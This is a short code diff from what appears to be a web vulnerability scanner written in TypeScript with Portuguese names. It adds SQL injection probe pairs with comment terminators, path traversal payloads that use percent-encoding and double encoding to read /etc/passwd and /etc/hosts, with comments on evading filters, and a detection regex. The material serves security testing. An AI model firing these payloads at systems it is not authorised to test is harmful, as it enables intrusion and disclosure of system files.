@@ -327,6 +327,8 @@ export async function sondarControleDeAcesso(
 const PARES_BOOLEANOS: readonly { verdadeiro: string; falso: string; rotulo: string }[] = [
   { verdadeiro: '1 AND 1=1', falso: '1 AND 1=2', rotulo: 'numérica' },
   { verdadeiro: "1' AND '1'='1", falso: "1' AND '1'='2", rotulo: 'texto' },
+  { verdadeiro: "1' AND '1'='1' -- ", falso: "1' AND '1'='2' -- ", rotulo: 'comentário --' },
+  { verdadeiro: "1' AND '1'='1' #", falso: "1' AND '1'='2' #", rotulo: 'comentário #' },
 ];
 const VALOR_DE_ERRO_SQL = "1'";
 
@@ -341,10 +343,18 @@ const CARGAS_DE_TRAVESSIA = [
   '../../../../../../../../etc/passwd',
   '....//....//....//....//....//....//etc/passwd',
   '..\\..\\..\\..\\..\\..\\windows\\win.ini',
+  // Barra percent-encoded: passa por filtros que só bloqueiam "/" cru.
+  '..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
+  // Ponto-ponto percent-encoded: passa por filtros que só bloqueiam ".." cru.
+  '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+  // Dupla codificação: sobrevive a uma única decodificação feita antes do filtro.
+  '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
+  '..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhosts',
 ];
 const PADROES_DE_ARQUIVO_PUBLICO: readonly { regex: RegExp; fragmento: RegExp }[] = [
   { regex: /root:[x*!]?:0:0:/, fragmento: /root:[x*!]?:0:0:/ },
   { regex: /\[fonts\]|for 16-bit app support/i, fragmento: /\[fonts\]|for 16-bit app support/i },
+  { regex: /127\.0\.0\.1\s+localhost/, fragmento: /127\.0\.0\.1\s+localhost/ },
 ];
 
 function construirSql(
